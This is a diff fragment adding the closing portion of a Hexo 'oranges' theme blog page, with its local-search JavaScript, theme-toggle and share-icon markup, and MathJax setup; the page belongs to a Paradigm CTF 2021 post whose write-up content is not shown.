+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + 09.market + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F08%2F15%2F19.Paradigm%2520CTF%25202021%2F09.market%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/08/15/19.Paradigm%20CTF%202021/09.market/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
+</body>
+</html>
